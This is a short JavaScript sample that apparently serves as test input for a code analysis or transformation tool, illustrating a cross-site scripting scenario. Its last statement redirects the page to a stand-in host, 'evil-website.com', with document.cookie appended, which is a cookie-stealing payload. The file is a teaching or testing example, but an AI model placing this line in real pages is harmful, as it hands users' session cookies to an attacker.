/* Target code to be transformed and analysed */

// Retrieve cookie information!
// Do not worry, this is just the cookie information
// for this website, which does not contain any of 
// your privacy information.
console.log(document.cookie);

// Suppose hacker has injected the following code
// into the current webpage by Cross-site Scripting (XSS).
// Oops! Injected JavaScript code tries to send
// your cookie information to evil guys!
window.location = 
  'http://evil-website.com?stolen-info=' + document.cookie;